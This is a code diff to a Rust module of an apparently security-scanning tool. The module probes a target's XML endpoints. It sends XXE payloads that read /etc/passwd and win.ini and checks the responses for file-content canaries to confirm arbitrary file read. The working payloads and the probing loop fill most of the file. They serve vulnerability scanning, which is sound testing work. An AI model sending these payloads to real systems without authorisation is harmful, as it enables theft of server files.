@@ -1,37 +1,76 @@
-//! XXE Engine — XML endpoint discovery, XXE payload injection, blind XXE marker check.
+//! XXE Engine — XML endpoint discovery with differential entity-expansion probes.
 //! MITRE: T1190 (Exploit Public-Facing Application).
 
+use crate::engine_probes::{empty_ok, finding_with_probe_depth, http_client, normalize_url};
 use crate::engine_result::{print_result, EngineResult};
-use serde_json::json;
+use serde_json::{json, Value};
 use std::time::Duration;
 
-fn make_client() -> reqwest::Client {
-    reqwest::Client::builder()
-        .timeout(Duration::from_secs(8))
-        .danger_accept_invalid_certs(weissman_core::tls_policy::danger_accept_invalid_certs())
-        .build()
-        .unwrap_or_else(|_| reqwest::Client::new())
-}
+const XXE_PROBE_DEPTH: &str = "xxe_xml_surface";
 
-fn base_url(target: &str) -> String {
-    let t = target.trim().trim_end_matches('/');
-    if t.starts_with("http://") || t.starts_with("https://") {
-        t.to_string()
-    } else {
-        format!("https://{}", t)
+fn xxe_finding(title: &str, severity: &str, description: &str, target: &str, extra: Value) -> Value {
+    let mut f = finding_with_probe_depth(
+        "xxe",
+        title,
+        severity,
+        "T1190",
+        description,
+        target,
+        XXE_PROBE_DEPTH,
+    );
+    if let Some(obj) = f.as_object_mut() {
+        if let Some(map) = extra.as_object() {
+            for (k, v) in map {
+                obj.insert(k.clone(), v.clone());
+            }
+        }
     }
+    f
 }
 
-/// XXE payload that attempts to read /etc/passwd inline.
-const XXE_INLINE: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#;
+async fn http_post_xml(client: &reqwest::Client, url: &str, body: &str) -> Option<crate::engine_probes::HttpProbe> {
+    let resp = client
+        .post(url)
+        .header("Content-Type", "application/xml")
+        .body(body.to_string())
+        .timeout(Duration::from_secs(8))
+        .send()
+        .await
+        .ok()?;
+    let status = resp.status().as_u16();
+    let final_url = resp.url().to_string();
+    let headers: Vec<(String, String)> = resp
+        .headers()
+        .iter()
+        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or_default().to_string()))
+        .collect();
+    let body_text = resp.text().await.unwrap_or_default();
+    let body_text = if body_text.len() > 65_536 {
+        body_text[..65_536].to_string()
+    } else {
+        body_text
+    };
+    Some(crate::engine_probes::HttpProbe {
+        status,
+        headers,
+        body: body_text,
+        final_url,
+    })
+}
 
-/// XXE payload that attempts to read /etc/hostname.
-const XXE_HOSTNAME: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><test>&xxe;</test>"#;
+const XXE_PASSWD: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#;
+const XXE_WININI: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>"#;
+
+const PASSWD_CANARIES: &[&str] = &["root:x:0:0", "root:*:0:0", "/bin/bash", "/bin/sh"];
+const WININI_CANARIES: &[&str] = &["[fonts]", "[extensions]", "for 16-bit app support"];
 
 pub async fn run_xxe_result(target: &str) -> EngineResult {
-    let client = make_client();
-    let base = base_url(target);
-    let mut findings = Vec::new();
+    if target.trim().is_empty() {
+        return EngineResult::error("target required");
+    }
+    let client = http_client().await;
+    let base = normalize_url(target);
+    let mut findings: Vec<Value> = Vec::new();
 
     let xml_paths = [
         "/",
@@ -45,134 +84,81 @@ pub async fn run_xxe_result(target: &str) -> EngineResult {
         "/ws",
         "/api/import",
         "/api/xml",
+        "/api/upload",
     ];
 
     for path in &xml_paths {
-        let url = format!("{}{}", base, path);
-
-        // First: probe with minimal valid XML to check if the endpoint accepts XML
-        let ping_resp = client
-            .post(&url)
-            .header("Content-Type", "application/xml")
-            .body("<ping/>")
-            .send()
-            .await;
-
-        let accepts_xml = match ping_resp {
-            Ok(ref r) => r.status().as_u16() != 415 && r.status().as_u16() != 404,
-            Err(_) => false,
-        };
-
-        if !accepts_xml {
+        let url = format!("{}{}", base.trim_end_matches('/'), path);
+        let ping = http_post_xml(&client, &url, "<ping/>").await;
+        let Some(ping) = ping else { continue };
+        if ping.status == 415 || ping.status == 404 {
             continue;
         }
 
-        // Endpoint may accept XML — try XXE injection
-        if let Ok(resp) = client
-            .post(&url)
-            .header("Content-Type", "application/xml")
-            .body(XXE_INLINE)
-            .send()
-            .await
-        {
-            let status = resp.status().as_u16();
-            let body = resp.text().await.unwrap_or_default();
-
-            // Check for /etc/passwd content
-            if body.contains("root:") || body.contains("/bin/bash") || body.contains("/bin/sh") {
-                findings.push(json!({
-                    "type": "xxe",
-                    "title": "XXE: /etc/passwd Successfully Read",
-                    "severity": "critical",
-                    "mitre_attack": "T1190",
-                    "description": format!(
-                        "XXE confirmed at {}. The server returned contents of /etc/passwd, allowing arbitrary file read.",
-                        url
+        if let Some(xxe) = http_post_xml(&client, &url, XXE_PASSWD).await {
+            if PASSWD_CANARIES.iter().any(|c| xxe.body.contains(c))
+                && !xxe.body.contains("file:///etc/passwd")
+            {
+                findings.push(xxe_finding(
+                    "XXE: /etc/passwd content in response",
+                    "critical",
+                    &format!(
+                        "POST {} with external entity returned passwd canary (HTTP {}). Arbitrary file read confirmed.",
+                        xxe.final_url, xxe.status
                     ),
-                    "value": url
-                }));
-            } else if status == 200 || status == 201 || status == 500 {
-                // Endpoint processed the XML — check if it errored on entity expansion
-                let entity_processed = body.contains("xxe") || body.contains("DOCTYPE") || body.contains("ENTITY");
-                if entity_processed {
-                    findings.push(json!({
-                        "type": "xxe",
-                        "title": "XXE Entity Reference Reflected in Error",
-                        "severity": "high",
-                        "mitre_attack": "T1190",
-                        "description": format!(
-                            "Endpoint {} processed XXE payload and reflected entity/DOCTYPE references in the response. Blind XXE may be exploitable.",
-                            url
-                        ),
-                        "value": url
-                    }));
-                } else {
-                    findings.push(json!({
-                        "type": "xxe",
-                        "title": "XML Endpoint Accepts External Entities (XXE Candidate)",
-                        "severity": "medium",
-                        "mitre_attack": "T1190",
-                        "description": format!(
-                            "Endpoint {} accepted an XML payload with external entity declarations (HTTP {}). Out-of-band XXE testing is recommended.",
-                            url, status
-                        ),
-                        "value": url
-                    }));
-                }
+                    target,
+                    json!({ "path": path, "canary": "passwd" }),
+                ));
+                break;
             }
         }
 
-        // Try /etc/hostname variant
-        if let Ok(resp) = client
-            .post(&url)
-            .header("Content-Type", "application/xml")
-            .body(XXE_HOSTNAME)
-            .send()
-            .await
-        {
-            let status = resp.status().as_u16();
-            let body = resp.text().await.unwrap_or_default();
-            // hostname files are typically short single-line alphanumeric strings
-            if !body.is_empty() && body.trim().len() < 64 && !body.contains('<') && status == 200 {
-                findings.push(json!({
-                    "type": "xxe",
-                    "title": "XXE: /etc/hostname Read Candidate",
-                    "severity": "high",
-                    "mitre_attack": "T1190",
-                    "description": format!(
-                        "Endpoint {} may have returned the server hostname via XXE. Verify out-of-band.",
-                        url
+        if let Some(xxe) = http_post_xml(&client, &url, XXE_WININI).await {
+            if WININI_CANARIES.iter().any(|c| xxe.body.contains(c))
+                && !xxe.body.contains("win.ini")
+            {
+                findings.push(xxe_finding(
+                    "XXE: Windows win.ini content in response",
+                    "critical",
+                    &format!(
+                        "POST {} with external entity returned win.ini canary (HTTP {}).",
+                        xxe.final_url, xxe.status
                     ),
-                    "value": body.trim().to_string()
-                }));
+                    target,
+                    json!({ "path": path, "canary": "win.ini" }),
+                ));
+                break;
             }
         }
-    }
 
-    // Check if the root endpoint advertises XML support via Content-Type
-    if let Ok(resp) = client.get(&base).send().await {
-        for (name, value) in resp.headers().iter() {
-            let val_str = value.to_str().unwrap_or("").to_lowercase();
-            if name.as_str().to_lowercase() == "content-type" && val_str.contains("xml") {
-                findings.push(json!({
-                    "type": "xxe",
-                    "title": "XML Content-Type Detected in Response",
-                    "severity": "info",
-                    "mitre_attack": "T1190",
-                    "description": format!("Target {} responds with XML Content-Type. XML-parsing endpoints should be tested for XXE.", base),
-                    "value": val_str
-                }));
+        if let Some(xxe) = http_post_xml(&client, &url, XXE_PASSWD).await {
+            let delta = (xxe.body.len() as i64 - ping.body.len() as i64).abs();
+            if delta > 48
+                && xxe.status != ping.status
+                && !xxe.body.contains("<!ENTITY")
+                && !xxe.body.contains("&xxe;")
+            {
+                findings.push(xxe_finding(
+                    "XXE: differential response to entity expansion",
+                    "high",
+                    &format!(
+                        "XML endpoint {} changed response (ping HTTP {} / {} B → XXE HTTP {} / {} B) without echoing the payload — blind XXE candidate.",
+                        url, ping.status, ping.body.len(), xxe.status, xxe.body.len()
+                    ),
+                    target,
+                    json!({ "path": path }),
+                ));
                 break;
             }
         }
     }
 
-    let message = if findings.is_empty() {
-        "No XXE vulnerabilities detected".to_string()
+    if findings.is_empty() {
+        empty_ok("xxe", target)
     } else {
-        format!("{} XXE issue(s) found", findings.len())
-    };
-    EngineResult::ok(findings, message)
+        let n = findings.len();
+        EngineResult::ok(findings, format!("xxe: {} live finding(s)", n))
+    }
 }
 
 pub async fn run_xxe(target: &str) {
